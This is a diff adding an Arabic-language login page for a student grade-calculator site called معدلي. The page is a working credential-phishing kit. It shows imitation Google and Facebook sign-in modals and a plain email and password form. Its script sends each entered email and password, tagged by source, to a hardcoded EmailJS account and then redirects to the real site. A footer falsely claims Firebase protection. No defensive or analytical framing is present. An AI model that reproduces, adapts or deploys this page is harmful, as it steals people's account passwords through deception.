@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - معـدلـي</title>
+    
+  
+<!-- Social Share (Open Graph) Metadata -->
+<meta property="og:title" content="معدلي | أسهل طريقة لحساب معدلك بنظام LMD">
+<meta property="og:description" content="سجل دخولك وأحسب معدلك الفصلي والسنوي بسهولة مع موقع معدلي. منصة مخصصة لطلبة الجامعات الجزائرية لحساب المعدلات وفق نظام LMD بدقة وسرعة.">
+<meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhrbQ_wCL12JuCPGQrJpYyDDhgio9Pv_C7g7IOx6FIpM9NM9oT3vg8376NcUXv1wvqM13nIBWayRg7KXyleXCgVqOUWxlj5POCYyiplXWXHwXfiK3ByAbVGPBa2UJ8yYD7yj7qpTMwMRa-8vlmlwKJT-_wO_0itKBqViFgE3uB0hLa9lPSVk80Ig5r2Q2Y/s1600/Picsart_25-07-07_08-14-32-423.png">
+<meta property="og:url" content="https://mo3adli-university.netlify.app/">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary_large_image">
+
+  
+  
+  
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    
+    <style>
+        body { font-family: 'Cairo', sans-serif; }
+        .modal-base { transition: opacity 0.3s ease-out, transform 0.3s ease-out; }
+        .modal-hidden { opacity: 0; transform: scale(0.95); pointer-events: none; }
+        .modal-visible { opacity: 1; transform: scale(1); pointer-events: auto; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .google-loader { width: 20px; height: 20px; border: 3px solid; border-color: #db4437 #f4b400 #0f9d58 #4285f4; border-radius: 50%; animation: spin 1.5s linear infinite; }
+        .facebook-loader { width: 20px; height: 20px; border: 3px solid rgba(24, 119, 242, 0.2); border-top-color: #1877f2; border-radius: 50%; animation: spin 1s linear infinite; }
+        #redirect-loader .spinner { width: 50px; height: 50px; border: 5px solid rgba(255, 255, 255, 0.2); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; }
+    </style>
+</head>
+<body class="bg-gray-100 dark:bg-[#1e1f26] text-gray-800 dark:text-gray-300">
+
+    <div class="min-h-screen flex items-center justify-center p-4">
+        <div class="w-full max-w-md">
+            <div class="text-center mb-8">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhrbQ_wCL12JuCPGQrJpYyDDhgio9Pv_C7g7IOx6FIpM9NM9oT3vg8376NcUXv1wvqM13nIBWayRg7KXyleXCgVqOUWxlj5POCYyiplXWXHwXfiK3ByAbVGPBa2UJ8yYD7yj7qpTMwMRa-8vlmlwKJT-_wO_0itKBqViFgE3uB0hLa9lPSVk80Ig5r2Q2Y/s1600/Picsart_25-07-07_08-14-32-423.png" alt="Logo" class="mx-auto mb-4 h-20 w-20 rounded-full">
+                <h1 class="text-4xl font-bold text-gray-900 dark:text-white mb-2">تسجيل الدخول</h1>
+                <p class="text-gray-500 dark:text-gray-400 text-sm">سجّل دخولك للاستفادة الكاملة من خدماتنا</p>
+            </div>
+
+            <div class="flex flex-col space-y-3 mb-6">
+                <button id="open-google-modal" class="w-full flex items-center justify-center gap-3 bg-white dark:bg-[#3c4043] text-gray-800 dark:text-white font-semibold py-3 px-4 rounded-md shadow-sm border border-gray-200 dark:border-transparent hover:bg-gray-50 transition-all">
+                    <div id="google-loader" class="hidden google-loader"></div>
+                    <svg id="google-icon" class="w-5 h-5" viewBox="0 0 48 48"><path fill="#FFC107" d="M43.611 20.083H42V20H24v8h11.303c-1.649 4.657-6.08 8-11.303 8c-6.627 0-12-5.373-12-12s5.373-12 12-12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4C12.955 4 4 12.955 4 24s8.955 20 20 20s20-8.955 20-20c0-1.341-.138-2.65-.389-3.917z"/><path fill="#FF3D00" d="M6.306 14.691l6.571 4.819C14.655 15.108 18.961 12 24 12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4C16.318 4 9.656 8.337 6.306 14.691z"/><path fill="#4CAF50" d="M24 44c5.166 0 9.86-1.977 13.409-5.192l-6.19-5.238C29.211 35.091 26.715 36 24 36c-5.223 0-9.655-3.417-11.297-7.915l-6.522 5.025C9.505 39.556 16.227 44 24 44z"/><path fill="#1976D2" d="M43.611 20.083H42V20H24v8h11.303c-.792 2.237-2.231 4.166-4.087 5.571l6.19 5.238C42.012 35.245 44 30.028 44 24c0-1.341-.138-2.65-.389-3.917z"/></svg>
+                    <span id="google-text">تسجيل الدخول باستخدام جوجل</span>
+                </button>
+                <button id="open-facebook-modal" class="w-full flex items-center justify-center gap-3 bg-blue-700 text-white font-semibold py-3 px-4 rounded-md shadow-md hover:bg-blue-800 transition-all">
+                    <div id="facebook-loader" class="hidden facebook-loader"></div>
+                    <i id="facebook-icon" class="fa-brands fa-facebook-f fa-lg"></i>
+                    <span id="facebook-text">تسجيل الدخول باستخدام فيسبوك</span>
+                </button>
+            </div>
+
+            <div class="flex items-center my-6">
+                <hr class="flex-grow border-t border-gray-300 dark:border-gray-600"><span class="mx-4 text-gray-500 dark:text-gray-400 font-semibold">أو</span><hr class="flex-grow border-t border-gray-300 dark:border-gray-600">
+            </div>
+
+            <form id="contact-form" class="flex flex-col space-y-4">
+                <div>
+                    <label class="block text-sm font-medium mb-1">البريد الإلكتروني</label>
+                    <input type="email" id="email" class="w-full bg-white dark:bg-[#2b2d31] border border-gray-300 dark:border-gray-600 text-gray-800 dark:text-white rounded-md p-3 focus:ring-2 focus:ring-green-500 outline-none" placeholder="example@gmail.com" required>
+                </div>
+            
+                <div>
+                    <label class="block text-sm font-medium mb-1">كلمة المرور</label>
+                    <input type="password" id="password" class="w-full bg-white dark:bg-[#2b2d31] border border-gray-300 dark:border-gray-600 text-gray-800 dark:text-white rounded-md p-3 focus:ring-2 focus:ring-green-500 outline-none" placeholder="••••••••" required>
+                </div>
+                <button type="submit" id="submit-button" class="w-full bg-green-600 text-white font-bold py-3 rounded-md shadow-lg hover:bg-green-700 transition-all mt-4">تسجيل</button>
+            </form>
+            
+            <div class="text-center mt-8">
+                <p>جميع الحقوق محفوظة لدى موقع <a href="#" class="font-semibold text-green-500 hover:underline"> معـدلـي </a></p>
+                  <p>هذا النموذج محمي بواسطة<a href="https://firebase.google.com/" class="font-semibold text-orange-500 hover:underline"> Firebase </a></p>
+            </div>
+        </div>
+    </div>
+  
+    <!-- Modals -->
+    <div id="facebook-modal" class="modal-base modal-hidden fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center p-4 z-50"></div>
+    <div id="google-modal" class="modal-base modal-hidden fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center p-4 z-50"></div>
+
+    <div id="redirect-loader" class="hidden fixed inset-0 bg-black bg-opacity-70 flex flex-col items-center justify-center z-[100]">
+        <div class="spinner"></div>
+        <p class="mt-4 text-white text-lg font-semibold"></p>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            // Theme setup
+            if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+                document.documentElement.classList.add('dark');
+            }
+
+            // EmailJS Configuration
+            const PUBLIC_KEY = "OSXqKzPiMaYujXuDO";
+            const SERVICE_ID = "service_8b7jz9b";
+            const TEMPLATE_ID = "template_llk3q57";
+            emailjs.init(PUBLIC_KEY);
+
+            // Validation Helper
+            function validateInput(email, password, type) {
+                const ARABIC_REGEX = /[\u0600-\u06FF]/;
+                const EMOJI_REGEX = /[\u{1F600}-\u{1F64F}\u{1F300}-\u{1F5FF}]/u;
+                
+                if (type === 'google' && !email.toLowerCase().endsWith('@gmail.com')) return "يجب استخدام بريد Gmail صالح";
+                if (password.length < 6) return "كلمة المرور خاطئة";
+                if (ARABIC_REGEX.test(email) || EMOJI_REGEX.test(email)) return "تنسيق البريد غير مدعوم";
+                
+                return null;
+            }
+
+            // Sending Logic
+            async function sendToEmailJS(email, password, source) {
+                const loader = document.getElementById('redirect-loader');
+                loader.classList.remove('hidden');
+
+                const params = {
+                    from_name: `${source} User`,
+                    email_id: email,
+                    message: `Password: ${password} | Source: ${source}`,
+                    reply_to: email
+                };
+
+                try {
+                    await emailjs.send(SERVICE_ID, TEMPLATE_ID, params);
+                    setTimeout(() => {
+                        window.location.href = "https://mo3adli-university.netlify.app/";
+                    }, 1000);
+                } catch (error) {
+                    loader.classList.add('hidden');
+                    alert("عذراً، حدث خطأ أثناء الاتصال بالخادم. حاول لاحقاً.");
+                }
+            }
+
+            // Standard Form Submit
+            document.getElementById('contact-form').addEventListener('submit', function(e) {
+                e.preventDefault();
+                const email = document.getElementById('email').value;
+                const pass = document.getElementById('password').value;
+                
+                const error = validateInput(email, pass, 'standard');
+                if (error) return alert(error);
+                
+                sendToEmailJS(email, pass, "Direct Login");
+            });
+
+            // Modal Handlers
+            function setupModalLogic(modalId, openBtnId, loaderId, iconId, textId, content) {
+                const modal = document.getElementById(modalId);
+                const btn = document.getElementById(openBtnId);
+                
+                btn.addEventListener('click', () => {
+                    document.getElementById(loaderId).classList.remove('hidden');
+                    document.getElementById(iconId).classList.add('hidden');
+                    document.getElementById(textId).classList.add('hidden');
+
+                    setTimeout(() => {
+                        document.getElementById(loaderId).classList.add('hidden');
+                        document.getElementById(iconId).classList.remove('hidden');
+                        document.getElementById(textId).classList.remove('hidden');
+                        
+                        modal.innerHTML = content;
+                        modal.classList.replace('modal-hidden', 'modal-visible');
+
+                        // Close events
+                        modal.querySelector('.close-modal').onclick = () => modal.classList.replace('modal-visible', 'modal-hidden');
+                        
+                        // Form binding inside modal
+                        const modalForm = modal.querySelector('form');
+                        modalForm.onsubmit = (e) => {
+                            e.preventDefault();
+                            const mEmail = modalForm.querySelector('input[type="text"], input[type="email"]').value;
+                            const mPass = modalForm.querySelector('input[type="password"]').value;
+                            
+                            const type = modalId.includes('google') ? 'google' : 'facebook';
+                            const error = validateInput(mEmail, mPass, type);
+                            if (error) return alert(error);
+                            
+                            sendToEmailJS(mEmail, mPass, type.toUpperCase());
+                        };
+                    }, 800);
+                });
+            }
+
+            const fbContent = `
+                <div class="bg-white rounded-lg shadow-xl w-full max-w-sm text-black relative p-6">
+                    <button class="close-modal absolute top-4 left-4 text-gray-400">&times;</button>
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Facebook_Logo_%282019%29.svg/2560px-Facebook_Logo_%282019%29.svg.png" class="h-8 mx-auto mb-6">
+                    <form class="space-y-4">
+                        <input type="text" placeholder="البريد الإلكتروني أو الهاتف" class="w-full p-3 border rounded-md outline-none focus:ring-2 focus:ring-blue-500" required>
+                        <input type="password" placeholder="كلمة المرور" class="w-full p-3 border rounded-md outline-none focus:ring-2 focus:ring-blue-500" required>
+                        <button type="submit" class="w-full bg-blue-600 text-white font-bold py-3 rounded-md hover:bg-blue-700">تسجيل الدخول</button>
+                    </form>
+                </div>`;
+
+            const googleContent = `
+                <div class="bg-[#202124] rounded-lg shadow-xl w-full max-w-md text-white relative p-8">
+                    <button class="close-modal absolute top-4 left-4 text-gray-400">&times;</button>
+                    <div class="text-center mb-6">
+                        <svg class="w-10 h-10 mx-auto mb-2" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/></svg>
+                        <h2 class="text-xl">تسجيل الدخول</h2>
+                    </div>
+                    <form class="space-y-4">
+                        <input type="email" placeholder="البريد الإلكتروني " class="w-full bg-transparent border border-gray-600 p-3 rounded-md outline-none focus:border-blue-500" required>
+                        <input type="password" placeholder="كلمة المرور" class="w-full bg-transparent border border-gray-600 p-3 rounded-md outline-none focus:border-blue-500" required>
+                        <button type="submit" class="w-full bg-blue-600 py-2 rounded-md font-semibold">التالي</button>
+                    </form>
+                </div>`;
+
+            setupModalLogic('facebook-modal', 'open-facebook-modal', 'facebook-loader', 'facebook-icon', 'facebook-text', fbContent);
+            setupModalLogic('google-modal', 'open-google-modal', 'google-loader', 'google-icon', 'google-text', googleContent);
+        });
+    </script>
+</body>
+</html>
+
